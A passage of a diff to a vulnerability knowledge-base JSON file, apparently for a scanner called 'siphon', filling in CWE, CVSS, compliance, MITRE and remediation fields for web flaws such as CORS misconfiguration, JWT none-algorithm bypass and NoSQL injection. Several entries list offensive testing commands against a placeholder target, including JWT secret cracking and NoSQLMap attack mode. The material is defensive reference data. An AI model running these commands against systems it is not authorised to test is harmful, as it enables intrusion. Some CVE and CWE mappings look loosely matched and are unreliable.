       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L",
-      "nessus_plugin_ids": [],
+      "nessus_plugin_ids": [
+        10498
+      ],
       "qualys_qids": [],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
+      "nist_csf2": [
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "CM-6",
+        "CM-7"
+      ],
       "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
       "hitrust": [],
       "gdpr": [],
       "mitre_attack": [],
-      "searchsploit_terms": [],
+      "searchsploit_terms": [
+        "http method",
+        "dav"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Disable HTTP method override support globally unless there is a specific and documented requirement for it, such as supporting legacy clients that cannot send PUT or DELETE. If method override must be retained, enforce that authorization controls are applied based on the effective overridden method, not the transport method. Restrict the set of methods that can be overridden to a minimal allowlist. Log all method override usage and alert on anomalous patterns. At the API gateway, block or audit requests that use method override headers on sensitive endpoints.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Server",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
         "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/",
@@ -6496,12 +8066,19 @@
     {
       "id": "SI-114",
       "title": "Missing Rate Limit on Sensitive Endpoint",
-      "aliases": [],
+      "aliases": [
+        "No Rate Limiting on API",
+        "Missing Rate Limit on Sensitive Endpoint",
+        "Missing Rate Limiting",
+        "Unrestricted API Calls"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
+      "cwe": [
+        "CWE-770"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 7.5,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
@@ -6509,23 +8086,43 @@
       "qualys_qids": [],
       "owasp_web": "",
       "owasp_api": "API4:2023 Unrestricted Resource Consumption",
-      "nist_csf2": [],
-      "nist_800_53": [],
+      "nist_csf2": [
+        "PR.PS-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SC-5",
+        "CM-6"
+      ],
       "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
       "hitrust": [],
       "gdpr": [],
-      "mitre_attack": [],
+      "mitre_attack": [
+        {
+          "technique": "T1499",
+          "tactic": "Impact",
+          "name": "Endpoint Denial of Service"
+        }
+      ],
       "searchsploit_terms": [],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Implement strict, dedicated rate limiting on all sensitive API endpoints, independent of any global rate limiting policy. Authentication endpoints should enforce per-IP limits (e.g., 5 attempts per minute) combined with per-account limits (e.g., 10 attempts per 15 minutes) with exponential backoff and account lockout or CAPTCHA challenge after threshold breach. OTP and password reset endpoints should enforce single-use token policies and short validity windows in addition to request rate limits. Return 429 Too Many Requests with a Retry-After header when limits are exceeded. Monitor sensitive endpoint access patterns for burst anomalies.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "API",
+      "remediation_category": "Architecture",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
         "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
@@ -6769,37 +8366,105 @@
     {
       "id": "SI-120",
       "title": "Broken Object Level Authorization (IDOR / BOLA)",
-      "aliases": [],
+      "aliases": [
+        "API Object Access Control Failure",
+        "API IDOR",
+        "Broken Object Level Authorization (IDOR / BOLA)",
+        "Unauthorized Object Access in API",
+        "Broken Object Authorization",
+        "BOLA"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "cwe": [
+        "CWE-639"
+      ],
+      "cve_examples": [
+        "CVE-2023-25690",
+        "CVE-2022-27226"
+      ],
+      "cvss_v3_base": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+      "nessus_plugin_ids": [
+        174660
+      ],
+      "qualys_qids": [
+        150141
+      ],
       "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "owasp_api": "API1:2023 \u2013 Broken Object Level Authorization",
+      "nist_csf2": [
+        "PR.AA-05"
+      ],
+      "nist_800_53": [
+        "AC-3"
+      ],
+      "nist_800_171": [
+        "3.1.3"
+      ],
+      "pci_dss_4": [
+        "7.2.1"
+      ],
+      "iso_27001": [
+        "A.9.4.1"
+      ],
+      "iso_27002": [
+        "9.4.1"
+      ],
+      "soc2": [
+        "CC6.3"
+      ],
+      "hitrust": [
+        "01.a"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1078",
+          "tactic": "Defense Evasion",
+          "name": "Valid Accounts"
+        }
+      ],
+      "searchsploit_terms": [
+        "broken object level authorization",
+        "idor api"
+      ],
       "metasploit_modules": [],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Enforce per-request object ownership validation. Do not trust client-supplied object IDs without authorization checks. Use UUIDs and validate ownership against the authenticated user's context.",
+      "remediation_component": "API",
+      "remediation_category": "Access Control",
+      "remediation_effort": "Moderate",
+      "validation_tools": [
+        {
+          "name": "Autorize (Burp extension)",
+          "type": "gui",
+          "url": "https://github.com/PortSwigger/autorize",
+          "install": "Burp Suite \u2192 BApp Store \u2192 search 'Autorize'",
+          "command": "# Setup: Log in as low-priv user, set auth header. Then browse as high-priv user.\n# Autorize replays requests with low-priv session and flags discrepancies.",
+          "description": "Automated authorization testing \u2014 replays every request with a lower-privileged session to detect BOLA/IDOR"
+        },
+        {
+          "name": "Arjun",
+          "type": "cli",
+          "url": "https://github.com/s0md3v/Arjun",
+          "install": "pip3 install arjun",
+          "command": "arjun -u https://TARGET/api/endpoint --stable -t 3",
+          "description": "HTTP parameter discovery scanner \u2014 finds hidden GET/POST/JSON parameters"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:6835",
@@ -6808,37 +8473,105 @@
     {
       "id": "SI-121",
       "title": "CORS Misconfiguration Allowing Credential Leakage",
-      "aliases": [],
+      "aliases": [
+        "Permissive CORS Policy",
+        "CORS Misconfiguration Allowing Credential Leakage",
+        "CORS Misconfiguration",
+        "Arbitrary Origin Reflection",
+        "Access-Control-Allow-Origin: *",
+        "Wildcard (*) Detected",
+        "CORS with Credentials Allowed",
+        "CORS Wildcard Origin"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
+      "cwe": [
+        "CWE-942"
+      ],
+      "cve_examples": [
+        "CVE-2022-29361",
+        "CVE-2021-23337"
+      ],
+      "cvss_v3_base": 7.4,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N",
+      "nessus_plugin_ids": [
+        158001
+      ],
+      "qualys_qids": [
+        150116
+      ],
+      "owasp_web": "A05:2021 \u2013 Security Misconfiguration",
+      "owasp_api": "API8:2023 \u2013 Security Misconfiguration",
+      "nist_csf2": [
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "CM-6",
+        "SC-8"
+      ],
       "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
       "hitrust": [],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1189",
+          "tactic": "Initial Access",
+          "name": "Drive-by Compromise"
+        }
+      ],
+      "searchsploit_terms": [
+        "cors origin bypass",
+        "cors misconfiguration wildcard",
+        "cors"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/cors_origin"
+      ],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Restrict CORS to explicitly defined, trusted origins. Never use wildcard (*) with credentials. Validate the Origin header against a server-side allowlist.",
+      "remediation_component": "Application",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
+      "validation_tools": [
+        {
+          "name": "CORStest",
+          "type": "cli",
+          "url": "https://github.com/RUB-NDS/CORStest",
+          "install": "git clone https://github.com/RUB-NDS/CORStest.git",
+          "command": "python corstest.py -i targets.txt -v",
+          "description": "CORS misconfiguration tester \u2014 checks for wildcard, null origin, and prefix bypass"
+        },
+        {
+          "name": "Corsy",
+          "type": "cli",
+          "url": "https://github.com/s0md3v/Corsy",
+          "install": "git clone https://github.com/s0md3v/Corsy.git && pip3 install -r requirements.txt",
+          "command": "python3 corsy.py -u https://TARGET -t 20",
+          "description": "CORS misconfiguration scanner covering 8 known bypass techniques"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:4350",
@@ -6847,37 +8580,107 @@
     {
       "id": "SI-122",
       "title": "CRLF Injection",
-      "aliases": [],
+      "aliases": [
+        "CRLF Injection"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
+      "cwe": [
+        "93",
+        "113"
+      ],
       "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
+      "cvss_v3_base": 6.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
       "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
+      "qualys_qids": [
+        150019
+      ],
+      "owasp_web": "A03:2021 \u2013 Injection",
       "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SC-8"
+      ],
+      "nist_800_171": [
+        "3.13.8",
+        "3.14.2"
+      ],
+      "pci_dss_4": [
+        "6.2.4",
+        "6.5.1"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.1"
+      ],
+      "hitrust": [
+        "09.ab",
+        "10.a"
+      ],
+      "gdpr": [
+        "Article 25",
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1539",
+          "tactic": "Collection",
+          "name": "Steal Web Session Cookie"
+        }
+      ],
+      "searchsploit_terms": [
+        "CRLF injection",
+        "HTTP response splitting"
+      ],
       "metasploit_modules": [],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Strip or encode carriage return (\\r, %0d) and line feed (\\n, %0a) characters from all user-supplied data before it is written into HTTP response headers. Use framework-provided header APIs rather than manual string construction. Apply input validation as a secondary layer.",
+      "remediation_component": "Web Application",
+      "remediation_category": "Injection Prevention",
+      "remediation_effort": "Low",
+      "validation_tools": [
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        },
+        {
+          "name": "Nikto",
+          "type": "cli",
+          "url": "https://github.com/sullo/nikto",
+          "install": "git clone https://github.com/sullo/nikto.git  OR  apt-get install nikto",
+          "command": "nikto -h https://TARGET -ssl -o nikto_report.html -Format html",
+          "description": "Web server scanner checking for dangerous files, outdated software, and misconfigurations"
+        },
+        {
+          "name": "ffuf",
+          "type": "cli",
+          "url": "https://github.com/ffuf/ffuf",
+          "install": "go install github.com/ffuf/ffuf/v2@latest",
+          "command": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403",
+          "description": "Fast web fuzzer for content discovery, vhost enumeration, parameter brute-forcing"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:5070",
@@ -6925,37 +8728,107 @@
     {
       "id": "SI-124",
       "title": "JWT None Algorithm Authentication Bypass",
-      "aliases": [],
+      "aliases": [
+        "JWT alg:none Vulnerability",
+        "JWT RS256 to HS256 Confusion",
+        "JWT Signature Bypass",
+        "JWT None Algorithm Authentication Bypass",
+        "JSON Web Token Bypass",
+        "JWT Algorithm Confusion"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "cwe": [
+        "CWE-347"
+      ],
+      "cve_examples": [
+        "CVE-2022-21449",
+        "CVE-2018-1000531",
+        "CVE-2015-9235"
+      ],
+      "cvss_v3_base": 9.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "nessus_plugin_ids": [
+        174656
+      ],
+      "qualys_qids": [
+        150130
+      ],
+      "owasp_web": "A07:2021 \u2013 Identification and Authentication Failures",
+      "owasp_api": "API2:2023 \u2013 Broken Authentication",
+      "nist_csf2": [
+        "PR.AA-01",
+        "PR.DS-01"
+      ],
+      "nist_800_53": [
+        "IA-5",
+        "SC-8"
+      ],
+      "nist_800_171": [
+        "3.5.10",
+        "3.13.8"
+      ],
+      "pci_dss_4": [
+        "4.2.1",
+        "8.3.6"
+      ],
+      "iso_27001": [
+        "A.9.4.2",
+        "A.10.1.1"
+      ],
+      "iso_27002": [
+        "9.4.2",
+        "10.1.1"
+      ],
+      "soc2": [
+        "CC6.1"
+      ],
+      "hitrust": [
+        "01.b",
+        "10.f"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1550.001",
+          "tactic": "Defense Evasion",
+          "name": "Use Alternate Authentication Material: Application Access Token"
+        }
+      ],
+      "searchsploit_terms": [
+        "jwt",
+        "json web token"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/jwt_none_alg_bypass"
+      ],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Reject JWTs with 'none' algorithm. Explicitly whitelist accepted algorithms (HS256 or RS256). Validate the 'alg' header server-side before verifying the signature.",
+      "remediation_component": "Authentication",
+      "remediation_category": "Authentication",
+      "remediation_effort": "Low",
+      "validation_tools": [
+        {
+          "name": "jwt_tool",
+          "type": "cli",
+          "url": "https://github.com/ticarpi/jwt_tool",
+          "install": "git clone https://github.com/ticarpi/jwt_tool.git && pip3 install -r requirements.txt",
+          "command": "python3 jwt_tool.py TOKEN -T   # tamper mode\npython3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack secret",
+          "description": "JWT testing toolkit: none-algorithm, weak secret cracking, claim tampering"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:5487",
@@ -6964,37 +8837,111 @@
     {
       "id": "SI-125",
       "title": "LDAP Injection",
-      "aliases": [],
+      "aliases": [
+        "LDAP Authentication Bypass",
+        "Directory Service Injection",
+        "LDAP Filter Injection",
+        "LDAP Injection in Login",
+        "LDAP Injection in API Parameter"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
+      "cwe": [
+        "CWE-90"
+      ],
+      "cve_examples": [
+        "CVE-2021-25120",
+        "CVE-2022-42898"
+      ],
+      "cvss_v3_base": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "nessus_plugin_ids": [
+        35291
+      ],
+      "qualys_qids": [
+        150042
+      ],
+      "owasp_web": "A03:2021 \u2013 Injection",
       "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1110",
+          "tactic": "Credential Access",
+          "name": "Brute Force"
+        }
+      ],
+      "searchsploit_terms": [
+        "ldap injection authentication",
+        "ldap injection",
+        "ldap bypass"
+      ],
+      "metasploit_modules": [
+        "auxiliary/gather/ldap_query"
+      ],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Escape all special characters in LDAP queries. Use parameterized LDAP APIs. Validate input against a strict allowlist before passing to directory queries.",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
+      "validation_tools": [
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        },
+        {
+          "name": "ffuf",
+          "type": "cli",
+          "url": "https://github.com/ffuf/ffuf",
+          "install": "go install github.com/ffuf/ffuf/v2@latest",
+          "command": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403",
+          "description": "Fast web fuzzer for content discovery, vhost enumeration, parameter brute-forcing"
+        },
+        {
+          "name": "nmap",
+          "type": "cli",
+          "url": "https://nmap.org",
+          "install": "apt-get install nmap  OR  brew install nmap",
+          "command": "nmap -sV -sC --script vuln -p TARGET\nnmap -sV --script ssl-enum-ciphers -p 443 TARGET",
+          "description": "Network discovery and security scanning with 600+ NSE scripts"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:4954",
@@ -7003,7 +8950,15 @@
     {
       "id": "SI-126",
       "title": "Mass Assignment / Privilege Escalation via Parameter Binding",
-      "aliases": [],
+      "aliases": [
+        "Over-Posted Parameters",
+        "Mass Assignment \u2014 Accepted",
+        "Hidden Field Tampering",
+        "Auto-Binding Vulnerability",
+        "Mass Assignment",
+        "Mass Assignment / Privilege Escalation via Parameter Binding",
+        "Parameter Binding Attack"
+      ],
       "source_tools": [
         "siphon"
       ],
@@ -7011,31 +8966,90 @@
       "cwe": [
         "CWE-915"
       ],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "cve_examples": [
+        "CVE-2012-3464",
+        "CVE-2021-21234"
+      ],
+      "cvss_v3_base": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+      "nessus_plugin_ids": [
+        174662
+      ],
+      "qualys_qids": [
+        150146
+      ],
+      "owasp_web": "A01:2021 \u2013 Broken Access Control",
+      "owasp_api": "API6:2023 \u2013 Unrestricted Access to Sensitive Business Flows",
+      "nist_csf2": [
+        "PR.AA-05"
+      ],
+      "nist_800_53": [
+        "AC-3",
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.1.3"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.9.4.1"
+      ],
+      "iso_27002": [
+        "9.4.1"
+      ],
+      "soc2": [
+        "CC6.3"
+      ],
+      "hitrust": [
+        "01.a"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "mitre_attack": [
+        {
+          "technique": "T1078",
+          "tactic": "Privilege Escalation",
+          "name": "Valid Accounts"
+        }
+      ],
+      "searchsploit_terms": [
+        "mass assignment parameter",
+        "ruby on rails mass assignment",
+        "mass assignment"
+      ],
       "metasploit_modules": [],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Use explicit allowlists (DTOs) to control which fields can be bound from requests. Never bind internal/privileged fields (isAdmin, role, credit) from user input directly.",
+      "remediation_component": "Application",
+      "remediation_category": "Access Control",
+      "remediation_effort": "Low",
+      "validation_tools": [
+        {
+          "name": "Arjun",
+          "type": "cli",
+          "url": "https://github.com/s0md3v/Arjun",
+          "install": "pip3 install arjun",
+          "command": "arjun -u https://TARGET/api/endpoint --stable -t 3",
+          "description": "HTTP parameter discovery scanner \u2014 finds hidden GET/POST/JSON parameters"
+        },
+        {
+          "name": "ffuf",
+          "type": "cli",
+          "url": "https://github.com/ffuf/ffuf",
+          "install": "go install github.com/ffuf/ffuf/v2@latest",
+          "command": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403",
+          "description": "Fast web fuzzer for content discovery, vhost enumeration, parameter brute-forcing"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "Automatic request-to-model binding lets an attacker set privileged or internal fields (e.g. role, is_admin, account_id) that are not part of the intended input, achieving privilege escalation or cross-account data manipulation without any other vulnerability.",
       "_scaffold_from": "siphon.py:5934",
@@ -7044,37 +9058,115 @@
     {
       "id": "SI-127",
       "title": "NoSQL Injection",
-      "aliases": [],
+      "aliases": [
+        "NoSQL Injection in API Parameter",
+        "CouchDB Injection",
+        "Operator Injection",
+        "Redis Injection",
+        "NoSQLi",
+        "MongoDB Injection",
+        "NoSQL Injection in API"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "cwe": [
+        "CWE-943"
+      ],
+      "cve_examples": [
+        "CVE-2019-7609",
+        "CVE-2022-36881"
+      ],
+      "cvss_v3_base": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+      "nessus_plugin_ids": [
+        174659
+      ],
+      "qualys_qids": [
+        150044
+      ],
+      "owasp_web": "A03:2021 \u2013 Injection",
+      "owasp_api": "API3:2023 \u2013 Injection",
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        }
+      ],
+      "searchsploit_terms": [
+        "nosql injection",
+        "mongodb injection"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/sqli_scanner"
+      ],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Sanitize and validate all input before passing to NoSQL query constructors. Use ODM libraries that enforce typed queries. Restrict MongoDB operators ($where, $regex) in user-supplied data.",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
+      "validation_tools": [
+        {
+          "name": "NoSQLMap",
+          "type": "cli",
+          "url": "https://github.com/codingo/NoSQLMap",
+          "install": "git clone https://github.com/codingo/NoSQLMap.git && pip install -r requirements.txt",
+          "command": "python3 nosqlmap.py --attack 1 --victim TARGET --webPort 80",
+          "description": "NoSQL injection and MongoDB exploitation tool"
+        },
+        {
+          "name": "mongoaudit",
+          "type": "cli",
+          "url": "https://github.com/stampery/mongoaudit",
+          "install": "pip install mongoaudit",
+          "command": "mongoaudit --host TARGET --port 27017",
+          "description": "Automated MongoDB security auditing tool \u2014 checks authentication, SSL, and authorization"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        },
+        {
+          "name": "ffuf",
+          "type": "cli",
